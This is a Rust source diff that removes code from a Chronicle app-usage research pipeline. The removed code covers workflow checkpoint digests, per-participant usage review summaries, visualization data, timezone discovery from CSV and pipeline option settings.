-            if canonical_components_needed {
-                if let Some(identity_order) = supplied_canonical_order {
-                    debug_assert_eq!(identity_order.len(), rows.len());
-                    #[cfg(debug_assertions)]
-                    {
-                        let mut observed = vec![false; rows.len()];
-                        for (position, &row_index) in identity_order.iter().enumerate() {
-                            debug_assert!(row_index < rows.len());
-                            debug_assert!(!observed[row_index]);
-                            observed[row_index] = true;
-                            if let Some(&next_index) = identity_order.get(position + 1) {
-                                debug_assert!(rows[row_index]
-                                    .source_data_rows
-                                    .cmp_expanded(&rows[next_index].source_data_rows)
-                                    .then(rows[row_index].index.cmp(&rows[next_index].index))
-                                    .is_le());
-                            }
-                        }
-                    }
-                    for &row_index in identity_order {
-                        record_canonical_parts(&row_parts[row_index]);
-                    }
-                } else if identity_is_already_sorted {
-                    for parts in *row_parts {
-                        record_canonical_parts(parts);
-                    }
-                } else {
-                    let mut identity_order: Vec<usize> = (0..rows.len()).collect();
-                    identity_order.sort_by(|left, right| {
-                        rows[*left]
-                            .source_data_rows
-                            .cmp_expanded(&rows[*right].source_data_rows)
-                            .then(rows[*left].index.cmp(&rows[*right].index))
-                    });
-                    for row_index in identity_order {
-                        record_canonical_parts(&row_parts[row_index]);
-                    }
-                }
-            }
-            if !reuse_order {
-                for (position, parts) in row_parts.iter().enumerate() {
-                    checkpoint_digest_positioned_fixed16(&mut order, position, &parts.identity);
-                }
-            }
-        } else if identity_is_already_sorted {
-            let mut scratch = RowCheckpointScratch::default();
-            for (position, row) in rows.iter().enumerate() {
-                let parts = row_checkpoint_parts(row, &mut scratch);
-                if canonical_components_needed {
-                    record_canonical_parts(&parts);
-                }
-                if !reuse_order {
-                    checkpoint_digest_positioned_fixed16(&mut order, position, &parts.identity);
-                }
-            }
-        } else {
-            let mut scratch = RowCheckpointScratch::default();
-            if canonical_components_needed {
-                let mut identity_order: Vec<usize> = (0..rows.len()).collect();
-                identity_order.sort_by(|left, right| {
-                    rows[*left]
-                        .source_data_rows
-                        .cmp_expanded(&rows[*right].source_data_rows)
-                        .then(rows[*left].index.cmp(&rows[*right].index))
-                });
-                for row_index in identity_order {
-                    let parts = row_checkpoint_parts(&rows[row_index], &mut scratch);
-                    record_canonical_parts(&parts);
-                }
-            }
-            if !reuse_order {
-                for (position, row) in rows.iter().enumerate() {
-                    let parts = row_checkpoint_parts(row, &mut scratch);
-                    checkpoint_digest_positioned_fixed16(&mut order, position, &parts.identity);
-                }
-            }
-        }
-    }
-    payload.update(&(payloads.len() as u64).to_le_bytes());
-    schema.update(&(payloads.len() as u64).to_le_bytes());
-    for (label, bytes) in payloads {
-        checkpoint_digest_field(&mut payload, label.as_bytes());
-        checkpoint_digest_field(&mut payload, bytes);
-        checkpoint_digest_field(&mut schema, label.as_bytes());
-    }
-    let previous_checkpoint = previous_row_state.map(|previous| previous.checkpoint);
-    let row_membership_digest = if reuse_membership {
-        previous_checkpoint
-            .expect("reuse requires a previous checkpoint")
-            .row_membership_digest
-            .clone()
-    } else {
-        finish_checkpoint_digest(membership)
-    };
-    let row_order_digest = if reuse_order {
-        previous_checkpoint
-            .expect("reuse requires a previous checkpoint")
-            .row_order_digest
-            .clone()
-    } else {
-        finish_checkpoint_digest(order)
-    };
-    let temporal_state_digest = if reuse_temporal {
-        previous_checkpoint
-            .expect("reuse requires a previous checkpoint")
-            .temporal_state_digest
-            .clone()
-    } else {
-        finish_checkpoint_digest(temporal)
-    };
-    let classification_digest = if reuse_classification {
-        previous_checkpoint
-            .expect("reuse requires a previous checkpoint")
-            .classification_digest
-            .clone()
-    } else {
-        finish_checkpoint_digest(classification)
-    };
-    let payload_digest = finish_checkpoint_digest(payload);
-    let schema_digest = finish_checkpoint_digest(schema);
-    #[cfg(feature = "query-timing")]
-    eprintln!(
-        "checkpoint_reuse node={node_id} rows={} membership={reuse_membership} order={reuse_order} temporal={reuse_temporal} classification={reuse_classification} elapsed_ms={:.3}",
-        row_groups.iter().map(|(_, rows)| rows.len()).sum::<usize>(),
-        checkpoint_started.elapsed().as_secs_f64() * 1000.0
-    );
-    let terminal_digest = terminal_checkpoint_digest(
-        node_id,
-        [
-            &row_membership_digest,
-            &row_order_digest,
-            &temporal_state_digest,
-            &classification_digest,
-            &payload_digest,
-            &schema_digest,
-        ],
-    );
-    WorkflowCheckpoint {
-        protocol_version: WORKFLOW_CHECKPOINT_PROTOCOL.into(),
-        subject_id: node_id.into(),
-        row_membership_digest,
-        row_order_digest,
-        temporal_state_digest,
-        classification_digest,
-        payload_digest,
-        schema_digest,
-        terminal_digest,
-    }
-}
-
-fn checkpoint_for_exact_row_state(
-    node_id: &str,
-    previous: &WorkflowCheckpoint,
-    payloads: &[(&str, &[u8])],
-) -> WorkflowCheckpoint {
-    debug_assert_eq!(previous.protocol_version, WORKFLOW_CHECKPOINT_PROTOCOL);
-    let mut payload = checkpoint_hasher("payload");
-    let mut schema = checkpoint_hasher("schema");
-    checkpoint_digest_field(&mut schema, WORKFLOW_ROW_SCHEMA.as_bytes());
-    schema.update(&1_u64.to_le_bytes());
-    checkpoint_digest_field(&mut schema, b"rows");
-    payload.update(&(payloads.len() as u64).to_le_bytes());
-    schema.update(&(payloads.len() as u64).to_le_bytes());
-    for (label, bytes) in payloads {
-        checkpoint_digest_field(&mut payload, label.as_bytes());
-        checkpoint_digest_field(&mut payload, bytes);
-        checkpoint_digest_field(&mut schema, label.as_bytes());
-    }
-    let row_membership_digest = previous.row_membership_digest.clone();
-    let row_order_digest = previous.row_order_digest.clone();
-    let temporal_state_digest = previous.temporal_state_digest.clone();
-    let classification_digest = previous.classification_digest.clone();
-    let payload_digest = finish_checkpoint_digest(payload);
-    let schema_digest = finish_checkpoint_digest(schema);
-    let terminal_digest = terminal_checkpoint_digest(
-        node_id,
-        [
-            &row_membership_digest,
-            &row_order_digest,
-            &temporal_state_digest,
-            &classification_digest,
-            &payload_digest,
-            &schema_digest,
-        ],
-    );
-    WorkflowCheckpoint {
-        protocol_version: WORKFLOW_CHECKPOINT_PROTOCOL.into(),
-        subject_id: node_id.into(),
-        row_membership_digest,
-        row_order_digest,
-        temporal_state_digest,
-        classification_digest,
-        payload_digest,
-        schema_digest,
-        terminal_digest,
-    }
-}
-
-fn checkpoint_for_exact_state(node_id: &str, previous: &WorkflowCheckpoint) -> WorkflowCheckpoint {
-    debug_assert_eq!(previous.protocol_version, WORKFLOW_CHECKPOINT_PROTOCOL);
-    let mut checkpoint = previous.clone();
-    checkpoint.subject_id = node_id.into();
-    checkpoint.terminal_digest = terminal_checkpoint_digest(
-        node_id,
-        [
-            &checkpoint.row_membership_digest,
-            &checkpoint.row_order_digest,
-            &checkpoint.temporal_state_digest,
-            &checkpoint.classification_digest,
-            &checkpoint.payload_digest,
-            &checkpoint.schema_digest,
-        ],
-    );
-    checkpoint
-}
-
-fn checkpoint_for_reordered_exact_rows(
-    node_id: &str,
-    rows: &[Row],
-    previous: &WorkflowCheckpoint,
-) -> WorkflowCheckpoint {
-    let mut checkpoint = checkpoint_for_exact_row_state(node_id, previous, &[]);
-    let mut order = checkpoint_hasher("row-order");
-    order.update(&1_u64.to_le_bytes());
-    checkpoint_digest_field(&mut order, b"rows");
-    order.update(&(rows.len() as u64).to_le_bytes());
-    let mut scratch = RowCheckpointScratch::default();
-    for (position, row) in rows.iter().enumerate() {
-        let parts = row_checkpoint_parts(row, &mut scratch);
-        checkpoint_digest_positioned_fixed16(&mut order, position, &parts.identity);
-    }
-    checkpoint.row_order_digest = finish_checkpoint_digest(order);
-    checkpoint.terminal_digest = terminal_checkpoint_digest(
-        node_id,
-        [
-            &checkpoint.row_membership_digest,
-            &checkpoint.row_order_digest,
-            &checkpoint.temporal_state_digest,
-            &checkpoint.classification_digest,
-            &checkpoint.payload_digest,
-            &checkpoint.schema_digest,
-        ],
-    );
-    checkpoint
-}
-
-fn workflow_rows_checkpoint(node_id: &str, rows: &[Row]) -> WorkflowCheckpoint {
-    workflow_checkpoint(node_id, &[("rows", rows)], &[])
-}
-
-fn workflow_rows_checkpoint_reusing_last(
-    node_id: &str,
-    rows: &[Row],
-    recorder: &QueryCheckpointRecorder<'_>,
-) -> WorkflowCheckpoint {
-    match recorder.reusable_row_components(rows) {
-        Some((parts, checkpoint)) => {
-            workflow_checkpoint_with_reusable_parts(node_id, rows, &[], parts, parts, checkpoint)
-        }
-        None => workflow_rows_checkpoint(node_id, rows),
-    }
-}
-
-fn workflow_state_checkpoint(node_id: &str, state: &str) -> WorkflowCheckpoint {
-    workflow_checkpoint(node_id, &[], &[("state", state.as_bytes())])
-}
-
-fn record_workflow_checkpoint(
-    digests: &mut BTreeMap<String, String>,
-    checkpoints: &mut BTreeMap<String, WorkflowCheckpoint>,
-    checkpoint: WorkflowCheckpoint,
-) {
-    digests.insert(
-        checkpoint.subject_id.clone(),
-        checkpoint.terminal_digest.clone(),
-    );
-    checkpoints.insert(checkpoint.subject_id.clone(), checkpoint);
-}
-
-struct QueryCheckpointRecorder<'a> {
-    digests: &'a mut BTreeMap<String, String>,
-    checkpoints: &'a mut BTreeMap<String, WorkflowCheckpoint>,
-    remaining_queries: std::slice::Iter<'static, crate::workflow_contract::WorkflowQueryDefinition>,
-    error: Option<String>,
-    last_row_parts: Option<Vec<RowCheckpointParts>>,
-    last_row_checkpoint: Option<WorkflowCheckpoint>,
-}
-
-impl QueryCheckpointRecorder<'_> {
-    fn rows(&mut self, query_id: &str, rows: &[Row]) {
-        let parts = row_checkpoint_parts_for_rows(rows);
-        let checkpoint = if let (Some(previous_parts), Some(previous_checkpoint)) = (
-            self.last_row_parts.as_deref(),
-            self.last_row_checkpoint.as_ref(),
-        ) {
-            workflow_checkpoint_with_reusable_parts(
-                query_id,
-                rows,
-                &[],
-                &parts,
-                previous_parts,
-                previous_checkpoint,
-            )
-        } else {
-            workflow_checkpoint_with_parts(query_id, &[("rows", rows)], &[], Some(&parts))
-        };
-        self.last_row_parts = Some(parts);
-        self.last_row_checkpoint = Some(checkpoint.clone());
-        self.record(checkpoint);
-    }
-
-    fn state(&mut self, query_id: &str, state: &str) {
-        self.record(workflow_state_checkpoint(query_id, state));
-    }
-
-    fn value<T: serde::Serialize>(&mut self, query_id: &str, value: &T) -> Result<(), String> {
-        let fingerprint = value_fingerprint(value)
-            .map_err(|error| format!("serialize {query_id} checkpoint: {error}"))?;
-        self.record(workflow_checkpoint(
-            query_id,
-            &[],
-            &[("value", &fingerprint)],
-        ));
-        Ok(())
-    }
-
-    fn rows_and_value<T: serde::Serialize>(
-        &mut self,
-        query_id: &str,
-        rows: &[Row],
-        value: &T,
-    ) -> Result<(), String> {
-        let fingerprint = value_fingerprint(value)
-            .map_err(|error| format!("serialize {query_id} checkpoint: {error}"))?;
-        let parts = row_checkpoint_parts_for_rows(rows);
-        let payloads = [("value", fingerprint.as_slice())];
-        let checkpoint = if let (Some(previous_parts), Some(previous_checkpoint)) = (
-            self.last_row_parts.as_deref(),
-            self.last_row_checkpoint.as_ref(),
-        ) {
-            workflow_checkpoint_with_reusable_parts(
-                query_id,
-                rows,
-                &payloads,
-                &parts,
-                previous_parts,
-                previous_checkpoint,
-            )
-        } else {
-            workflow_checkpoint_with_parts(query_id, &[("rows", rows)], &payloads, Some(&parts))
-        };
-        self.last_row_parts = Some(parts);
-        self.last_row_checkpoint = Some(checkpoint.clone());
-        self.record(checkpoint);
-        Ok(())
-    }
-
-    fn last_row_parts(&self) -> Option<&[RowCheckpointParts]> {
-        self.last_row_parts.as_deref()
-    }
-
-    fn take_last_row_parts(&mut self) -> Option<Vec<RowCheckpointParts>> {
-        self.last_row_checkpoint = None;
-        self.last_row_parts.take()
-    }
-
-    fn reusable_row_components(
-        &self,
-        rows: &[Row],
-    ) -> Option<(&[RowCheckpointParts], &WorkflowCheckpoint)> {
-        let parts = self.last_row_parts.as_deref()?;
-        if parts.len() != rows.len() {
-            return None;
-        }
-        #[cfg(debug_assertions)]
-        assert_eq!(
-            parts,
-            row_checkpoint_parts_for_rows(rows),
-            "attempted to reuse stale row checkpoint components"
-        );
-        Some((parts, self.last_row_checkpoint.as_ref()?))
-    }
-
-    fn record(&mut self, checkpoint: WorkflowCheckpoint) {
-        if self.error.is_some() {
-            return;
-        }
-        let Some(expected) = self.remaining_queries.next() else {
-            self.error = Some(format!(
-                "unexpected extra workflow query checkpoint {:?}",
-                checkpoint.subject_id
-            ));
-            return;
-        };
-        if checkpoint.subject_id != expected.id {
-            self.error = Some(format!(
-                "workflow query checkpoint order mismatch: expected {:?}, recorded {:?}",
-                expected.id, checkpoint.subject_id
-            ));
-            return;
-        }
-        if self.checkpoints.contains_key(&checkpoint.subject_id) {
-            self.error = Some(format!(
-                "duplicate workflow query checkpoint {:?}",
-                checkpoint.subject_id
-            ));
-            return;
-        }
-        record_workflow_checkpoint(self.digests, self.checkpoints, checkpoint);
-    }
-
-    fn finish(mut self) -> Result<(), String> {
-        if let Some(error) = self.error {
-            return Err(error);
-        }
-        if let Some(next) = self.remaining_queries.next() {
-            return Err(format!(
-                "workflow query checkpoint sequence stopped before {:?}",
-                next.id,
-            ));
-        }
-        Ok(())
-    }
-}
-
-fn timezone_retained_source_rows_digest(rows: &[Row]) -> String {
-    let source_rows = rows
-        .iter()
-        .flat_map(|row| row.source_data_rows.iter())
-        .collect::<BTreeSet<_>>();
-    let mut hasher = Sha256::new();
-    hasher.update((source_rows.len() as u64).to_le_bytes());
-    for source_row in source_rows {
-        hasher.update(source_row.to_le_bytes());
-    }
-    format!("sha256:{}", hex::encode(hasher.finalize()))
-}
-
-/// Hash the product-local state at the timezone normalization joint. This is
-/// intentionally not a generic graph-node serialization: it records exactly
-/// the Chronicle fields whose identity is established at this stage.
-fn timezone_stage_digest(rows: &[Row]) -> String {
-    let mut hasher = Sha256::new();
-    hasher.update((rows.len() as u64).to_le_bytes());
-    for row in rows {
-        hasher.update((row.source_data_rows.len() as u64).to_le_bytes());
-        for source_row in row.source_data_rows.iter() {
-            hasher.update(source_row.to_le_bytes());
-        }
-        for value in [
-            row.study_id.as_str(),
-            row.participant_id.as_str(),
-            row.possible_device_model.as_str(),
-            row.username.as_str(),
-            row.application_label.as_str(),
-            row.interaction_type.as_str(),
-            row.app_package_name.as_str(),
-            row.timezone.as_str(),
-            row.date.as_str(),
-        ] {
-            sha256_digest_field(&mut hasher, value.as_bytes());
-        }
-        hasher.update(row.event_timestamp_ns.to_le_bytes());
-        hasher.update([
-            row.day,
-            row.weekday_mf,
-            row.weekday_mth,
-            row.weekday_su_th,
-            row.hour,
-            row.quarter,
-        ]);
-        hasher.update((row.index as u64).to_le_bytes());
-    }
-    format!("sha256:{}", hex::encode(hasher.finalize()))
-}
-
-#[derive(Debug, serde::Serialize)]
-#[serde(rename_all = "camelCase")]
-struct ReviewSummary {
-    participants: Vec<ReviewParticipantSummary>,
-}
-
-#[derive(Debug, serde::Serialize)]
-#[serde(rename_all = "camelCase")]
-struct ReviewParticipantSummary {
-    participant_id: SharedString,
-    study_id: SharedString,
-    totals: ReviewParticipantTotals,
-    per_day: Vec<ReviewDayMetrics>,
-    top_apps_by_date: BTreeMap<SharedString, Vec<ReviewTopApp>>,
-}
-
-#[derive(Debug, serde::Serialize)]
-#[serde(rename_all = "camelCase")]
-struct ReviewParticipantTotals {
-    app_usage_minutes: f64,
-    background_app_usage_minutes: f64,
-    screen_usage_minutes: f64,
-    app_session_count: usize,
-    screen_session_count: usize,
-    days_with_usage: usize,
-    total_days: usize,
-}
-
-#[derive(Debug, Clone, serde::Serialize)]
-#[serde(rename_all = "camelCase")]
-struct ReviewDayMetrics {
-    date: SharedString,
-    app_usage_minutes: f64,
-    background_app_usage_minutes: f64,
-    screen_usage_minutes: f64,
-    app_session_count: usize,
-    screen_session_count: usize,
-    flags: Vec<String>,
-}
-
-#[derive(Debug, serde::Serialize)]
-#[serde(rename_all = "camelCase")]
-struct ReviewTopApp {
-    app_package_name: SharedString,
-    application_label: SharedString,
-    category: Option<SharedString>,
-    minutes: f64,
-}
-
-#[derive(Default)]
-struct ReviewDayAccumulator {
-    app_ns: i128,
-    background_ns: i128,
-    screen_ns: i128,
-    app_session_count: usize,
-    screen_session_count: usize,
-}
-
-struct ReviewTopAppAccumulator {
-    application_label: SharedString,
-    category: Option<SharedString>,
-    minutes: f64,
-}
-
-#[derive(Debug, serde::Serialize)]
-#[serde(rename_all = "camelCase")]
-struct VisualizationData<'a> {
-    protocol_version: &'static str,
-    columns: &'static [&'static str],
-    app_rows: Vec<VisualizationRow<'a>>,
-    screen_rows: Vec<VisualizationRow<'a>>,
-    event_timestamps_by_participant: BTreeMap<&'a str, Vec<JsonI64>>,
-}
-
-#[derive(Debug, Clone, Copy)]
-struct JsonI64(i64);
-
-impl serde::Serialize for JsonI64 {
-    fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>
-    where
-        S: serde::Serializer,
-    {
-        serializer.collect_str(&self.0)
-    }
-}
-
-const VISUALIZATION_DATA_PROTOCOL: &str = "chronicle-visualization-data/v2";
-const VISUALIZATION_DATA_COLUMNS: &[&str] = &[
-    "participantId",
-    "date",
-    "startTimestampNs",
-    "stopTimestampNs",
-    "eventTimestampNs",
-    "interactionType",
-    "broadAppCategory",
-    "appPackageName",
-    "applicationLabel",
-    "username",
-    "screenUsageEndReason",
-];
-
-#[derive(Debug, serde::Serialize)]
-struct VisualizationRow<'a>(
-    &'a str,
-    &'a str,
-    Option<JsonI64>,
-    Option<JsonI64>,
-    JsonI64,
-    &'a str,
-    Option<&'a str>,
-    &'a str,
-    &'a str,
-    &'a str,
-    Option<&'a str>,
-);
-
-fn visualization_row(row: &Row) -> VisualizationRow<'_> {
-    VisualizationRow(
-        row.participant_id.as_str(),
-        row.date.as_str(),
-        row.start_timestamp_ns.map(JsonI64),
-        row.stop_timestamp_ns.map(JsonI64),
-        JsonI64(row.event_timestamp_ns),
-        row.interaction_type.as_str(),
-        row.broad_app_category.as_ref().map(SharedString::as_str),
-        row.app_package_name.as_str(),
-        row.application_label.as_str(),
-        row.username.as_str(),
-        row.screen_usage_end_reason
-            .as_ref()
-            .map(SharedString::as_str),
-    )
-}
-
-fn build_visualization_data<'a>(
-    app_rows: &'a [Row],
-    screen_rows: &'a [Row],
-    policy_rows: &'a [Row],
-) -> VisualizationData<'a> {
-    let mut event_timestamps_by_participant = BTreeMap::<&str, Vec<JsonI64>>::new();
-    for row in policy_rows {
-        event_timestamps_by_participant
-            .entry(if row.participant_id.is_empty() {
-                "unknown"
-            } else {
-                row.participant_id.as_str()
-            })
-            .or_default()
-            .push(JsonI64(row.event_timestamp_ns));
-    }
-    VisualizationData {
-        protocol_version: VISUALIZATION_DATA_PROTOCOL,
-        columns: VISUALIZATION_DATA_COLUMNS,
-        app_rows: app_rows.iter().map(visualization_row).collect(),
-        screen_rows: screen_rows.iter().map(visualization_row).collect(),
-        event_timestamps_by_participant,
-    }
-}
-
-fn review_round4(value: f64) -> f64 {
-    (value * 10_000.0).round() / 10_000.0
-}
-
-fn complete_session(row: &Row, interaction_type: &str) -> bool {
-    row.interaction_type == interaction_type
-        && row.start_timestamp_ns.is_some()
-        && row.stop_timestamp_ns.is_some()
-}
-
-fn review_duration_ns(row: &Row) -> i128 {
-    if row.duration_minutes.is_none() {
-        return 0;
-    }
-    i128::from(row.stop_timestamp_ns.unwrap_or_default())
-        - i128::from(row.start_timestamp_ns.unwrap_or_default())
-}
-
-fn review_minutes(ns: i128) -> f64 {
-    review_round4(ns as f64 / 60_000_000_000.0)
-}
-
-fn build_review_summary(app_rows: &[Row], screen_rows: &[Row]) -> ReviewSummary {
-    type ParticipantKey = (SharedString, SharedString);
-    type DayKey = (SharedString, SharedString, SharedString);
-    // Accumulation order is irrelevant: the emitted participant/day maps are
-    // sorted below, and each top-app list has an explicit deterministic sort.
-    // Hash maps avoid doing tree comparisons for every one of the tens of
-    // thousands of review rows while preserving byte-identical JSON.
-    let mut days = AHashMap::<DayKey, ReviewDayAccumulator>::new();
-    let mut apps_by_participant = AHashMap::<
-        ParticipantKey,
-        AHashMap<SharedString, AHashMap<SharedString, ReviewTopAppAccumulator>>,
-    >::new();
-
-    for row in app_rows {
-        let key = (
-            row.study_id.clone(),
-            row.participant_id.clone(),
-            row.date.clone(),
-        );
-        // The review day-detail intentionally includes any emitted app row
-        // with a measured duration (including explicitly labeled filtered or
-        // non-target rows), even though headline usage totals remain limited
-        // to App Usage sessions.
-        if let Some(minutes) = row.duration_minutes {
-            let entry = apps_by_participant
-                .entry((key.0.clone(), key.1.clone()))
-                .or_insert_with(AHashMap::new)
-                .entry(key.2.clone())
-                .or_insert_with(AHashMap::new)
-                .entry(row.app_package_name.clone())
-                .or_insert_with(|| ReviewTopAppAccumulator {
-                    application_label: row.application_label.clone(),
-                    category: row.broad_app_category.clone(),
-                    minutes: 0.0,
-                });
-            entry.minutes += minutes;
-        }
-        if !complete_session(row, APP_USAGE) {
-            continue;
-        }
-        let day = days.entry(key).or_default();
-        if row.usage_layer.as_deref() == Some("secondary") {
-            day.background_ns += review_duration_ns(row);
-        } else {
-            day.app_ns += review_duration_ns(row);
-            day.app_session_count += 1;
-        }
-    }
-    for row in screen_rows {
-        if !complete_session(row, SCREEN_USAGE) {
-            continue;
-        }
-        let key = (
-            row.study_id.clone(),
-            row.participant_id.clone(),
-            row.date.clone(),
-        );
-        let day = days.entry(key).or_default();
-        day.screen_ns += review_duration_ns(row);
-        day.screen_session_count += 1;
-    }
-
-    let mut observed = BTreeMap::<ParticipantKey, BTreeMap<SharedString, ReviewDayMetrics>>::new();
-    for ((study_id, participant_id, date), day) in days {
-        observed
-            .entry((study_id, participant_id))
-            .or_default()
-            .insert(
-                date.clone(),
-                ReviewDayMetrics {
-                    date,
-                    app_usage_minutes: review_minutes(day.app_ns),
-                    background_app_usage_minutes: review_minutes(day.background_ns),
-                    screen_usage_minutes: review_minutes(day.screen_ns),
-                    app_session_count: day.app_session_count,
-                    screen_session_count: day.screen_session_count,
-                    flags: Vec::new(),
-                },
-            );
-    }
-
-    let mut participants = Vec::new();
-    for ((study_id, participant_id), observed_days) in observed {
-        let first = observed_days
-            .keys()
-            .next()
-            .map(SharedString::as_str)
-            .unwrap_or_default();
-        let last = observed_days
-            .keys()
-            .next_back()
-            .map(SharedString::as_str)
-            .unwrap_or_default();
-        let mut per_day = Vec::new();
-        if let (Ok(start), Ok(end)) = (
-            NaiveDate::parse_from_str(first, "%Y-%m-%d"),
-            NaiveDate::parse_from_str(last, "%Y-%m-%d"),
-        ) {
-            for day in start.iter_days().take_while(|day| *day <= end) {
-                let date = day.format("%Y-%m-%d").to_string();
-                per_day.push(observed_days.get(date.as_str()).cloned().unwrap_or(
-                    ReviewDayMetrics {
-                        date: SharedString::from(date),
-                        app_usage_minutes: 0.0,
-                        background_app_usage_minutes: 0.0,
-                        screen_usage_minutes: 0.0,
-                        app_session_count: 0,
-                        screen_session_count: 0,
-                        flags: vec!["no_usage_day".into()],
-                    },
-                ));
-            }
-        }
-
-        let mut totals = ReviewParticipantTotals {
-            app_usage_minutes: 0.0,
-            background_app_usage_minutes: 0.0,
-            screen_usage_minutes: 0.0,
-            app_session_count: 0,
-            screen_session_count: 0,
-            days_with_usage: 0,
-            total_days: per_day.len(),
-        };
-        for day in &per_day {
-            totals.app_usage_minutes += day.app_usage_minutes;
-            totals.background_app_usage_minutes += day.background_app_usage_minutes;
-            totals.screen_usage_minutes += day.screen_usage_minutes;
-            totals.app_session_count += day.app_session_count;
-            totals.screen_session_count += day.screen_session_count;
-            if day.app_session_count + day.screen_session_count > 0
-                || day.background_app_usage_minutes > 0.0
-            {
-                totals.days_with_usage += 1;
-            }
-        }
-        totals.app_usage_minutes = review_round4(totals.app_usage_minutes);
-        totals.background_app_usage_minutes = review_round4(totals.background_app_usage_minutes);
-        totals.screen_usage_minutes = review_round4(totals.screen_usage_minutes);
-
-        let mut top_apps_by_date = BTreeMap::new();
-        for date in observed_days.keys() {
-            let Some(by_package) = apps_by_participant
-                .get(&(study_id.clone(), participant_id.clone()))
-                .and_then(|days| days.get(date))
-            else {
-                continue;
-            };
-            let mut top_apps: Vec<_> = by_package
-                .iter()
-                .map(|(app_package_name, accumulated)| ReviewTopApp {
-                    app_package_name: app_package_name.clone(),
-                    application_label: accumulated.application_label.clone(),
-                    category: accumulated.category.clone(),
-                    minutes: review_round4(accumulated.minutes),
-                })
-                .collect();
-            top_apps.sort_by(|left, right| {
-                right
-                    .minutes
-                    .total_cmp(&left.minutes)
-                    .then_with(|| left.app_package_name.cmp(&right.app_package_name))
-            });
-            top_apps.truncate(12);
-            if !top_apps.is_empty() {
-                top_apps_by_date.insert(date.clone(), top_apps);
-            }
-        }
-
-        participants.push(ReviewParticipantSummary {
-            participant_id,
-            study_id,
-            totals,
-            per_day,
-            top_apps_by_date,
-        });
-    }
-    participants.sort_by(|left, right| left.participant_id.cmp(&right.participant_id));
-    ReviewSummary { participants }
-}
-
-#[derive(Debug, Clone, Copy, Default)]
-pub struct PipelineV2SupportFiles<'a> {
-    pub filter_csv: &'a [u8],
-    pub apps_forcing_csv: &'a [u8],
-    pub background_apps_csv: &'a [u8],
-    pub codebook_csv: &'a [u8],
-    pub study_dates_csv: &'a [u8],
-    pub device_sharing_csv: &'a [u8],
-    pub survey_attribution_csv: &'a [u8],
-    pub enrolled_devices_csv: &'a [u8],
-}
-
-/// Discover normalized IANA timezones through the Rust ingest boundary. Empty
-/// timezone cells use the product's UTC default; rows without an event
-/// timestamp are ignored exactly as they are by preprocessing.
-pub fn discover_timezones_v2_native(csv_bytes: &[u8]) -> Result<Vec<String>, String> {
-    let mut timezones = BTreeSet::new();
-    // PHI safety: raw cell values must never enter error strings surfaced to
-    // the UI/console — report the 1-based data-row position instead. The
-    // physical data-row number counts every data record in the file (including
-    // all-empty skipped records) so it matches the row the incremental
-    // executor reports for the same cell.
-    for (data_row, record) in parse_csv_to_records_with_physical_rows(csv_bytes) {
-        let timestamp = record
-            .get("event_timestamp")
-            .map(|value| value.trim())
-            .unwrap_or_default();
-        if timestamp.is_empty() {
-            continue;
-        }
-        parse_chronicle_timestamp_ns(timestamp)
-            .ok_or_else(|| format!("Invalid event_timestamp at data row {data_row}"))?;
-        let timezone = record
-            .get("timezone")
-            .map(|value| value.trim())
-            .filter(|value| !value.is_empty() && *value != "None")
-            .unwrap_or("UTC");
-        timezone
-            .parse::<Tz>()
-            .map_err(|_| format!("invalid timezone value at data row {data_row}"))?;
-        timezones.insert(timezone.to_string());
-    }
-    Ok(timezones.into_iter().collect())
-}
-
-#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
-pub struct PipelineV2OptionsJson {
-    pub study_name: String,
-    pub timezone: String,
-    #[serde(default = "default_timezone_handling")]
-    pub timezone_handling: String,
-    pub usage_session_mode: String,
-    pub include_app_output: bool,
-    pub include_screen_output: bool,
-    pub use_filter_file: bool,
-    pub use_apps_forcing_screen_open: bool,
-    #[serde(default)]
-    pub use_background_apps_file: bool,
-    pub use_app_codebook: bool,
-    #[serde(default)]
-    pub include_category_column: bool,
-    #[serde(default = "default_true")]
-    pub deduplicate_exact_rows: bool,
-    #[serde(default)]
-    pub interaction_type_remap: Vec<String>,
-    pub correct_duplicate_event_timestamps: bool,
-    pub allow_stop_event_reuse: bool,
-    pub use_activity_stopped_as_fallback: bool,
-    pub apply_threshold_to_fallback: bool,
-    pub long_duration_threshold_ns: i64,
-    #[serde(default)]
-    pub proximity_interval_ns: i64,
-    pub custom_app_engagement_duration: f64,
-    pub long_data_time_gap_thresholds: Vec<f64>,
-    pub long_usage_duration_thresholds: Vec<f64>,
-    pub same_app_stop_types: Vec<String>,
-    pub other_stop_types: Vec<String>,
-    pub interaction_types_to_remove: Vec<String>,
-    pub screen_auto_lock_timeout_seconds: f64,
-    pub screen_auto_lock_tolerance_seconds: f64,
-    pub screen_manual_lock_max_tail_seconds: f64,
-    pub screen_keyguard_near_stop_seconds: f64,
-    pub datetime_of_preprocessing: String,
-    #[serde(default)]
-    pub model_concurrent_usage: bool,
-    #[serde(default)]
-    pub minimum_usage_duration: f64,
-    #[serde(default)]
-    pub apply_minimum_usage_duration_to_concurrent_subintervals: bool,
-    #[serde(default)]
-    pub filter_zero_duration_sessions: bool,
-    #[serde(default)]
-    pub add_no_activity_placeholder_days: bool,
-    #[serde(default)]
-    pub enable_study_window_filter: bool,
-    #[serde(default)]
-    pub enable_person_attribution: bool,
-    #[serde(default)]
-    pub enable_day_coverage: bool,
-    #[serde(default)]
-    pub enable_compliance_scoring: bool,
-    #[serde(default = "default_compliance_threshold_percent")]
-    pub compliance_threshold_percent: f64,
-    #[serde(default)]
-    pub enable_screen_gated_crediting: bool,
-    #[serde(default)]
-    pub enable_parquet_export: bool,
-    #[serde(default)]
-    pub enable_spss_export: bool,
-    #[serde(default)]
-    pub enable_aggregates: bool,
-    #[serde(default = "default_aggregate_shape")]
-    pub aggregate_shape: String,
-    // Exact browser view settings are carried in the Rust receipt even though
-    // the dependency certificate correctly excludes them from preprocessing.
-    #[serde(default = "default_true")]
-    pub enable_plotting: bool,
-    #[serde(default)]
-    pub enable_activity_heatmap: bool,
-    #[serde(default)]
-    pub export_plots_as_svg: bool,
-    #[serde(default)]
-    pub enable_interactive_timeline: bool,
-    #[serde(default)]
-    pub include_filtered_app_usage_in_plots: bool,
-    #[serde(default)]
-    pub materialize_visualization_data: Option<bool>,
-    #[serde(default = "default_credited_session_cap_minutes")]
-    pub credited_session_cap_minutes: f64,
-    #[serde(default = "default_device_liveness_gap_tolerance_minutes")]
-    pub device_liveness_gap_tolerance_minutes: f64,
-    #[serde(default = "default_auto_lock_bridge_seconds")]
-    pub auto_lock_bridge_seconds: f64,
-    #[serde(default = "default_no_witness_min_day_apps")]
